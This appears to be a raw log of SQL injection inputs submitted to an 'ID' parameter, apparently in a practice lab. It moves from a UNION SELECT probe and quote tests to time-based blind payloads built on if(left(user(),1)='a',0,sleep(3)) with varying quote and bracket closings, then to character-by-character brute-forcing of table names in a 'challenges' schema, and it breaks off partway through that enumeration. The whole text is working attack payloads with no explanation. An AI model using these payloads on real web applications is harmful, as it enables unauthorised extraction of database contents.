ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1)) and if(left(user(),1)='a',0,sleep(3)) #
ID:1)) and if(left(user(),1)='a',0,sleep(3)) #
ID:1')) and if(left(user(),1)='a',0,sleep(3)) #
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1 and if(left(user(),1)='a',0,sleep(3)) #
ID:1 and if(left(user(),1)='a',0,sleep(3)) #
ID:1')) and if(left(user(),1)='a',0,sleep(3)) #
ID:1")) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1" and if(left(user(),1)='a',0,sleep(3)) #
ID:1))) and if(left(user(),1)='a',0,sleep(3)) #
ID:1)))) and if(left(user(),1)='a',0,sleep(3)) #
ID:1)))) and if(left(user(),1)='a',0,sleep(3)) #
ID:1'"' and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1) and if(left(user(),1)='b',0,sleep(3)) #
ID:1) and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if(left(user(),1)='a',0,sleep(3)) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'aa') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ab') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ac') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ad') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ae') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'af') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ag') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ah') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ai') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'aj') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ak') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'al') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'am') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'an') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ao') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ap') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'aq') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ar') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'as') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'at') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'au') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'av') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'aw') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ax') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ay') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'az') , sleep(3) , 0) #
ID:1") and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'aA') , sleep(3) , 0) #
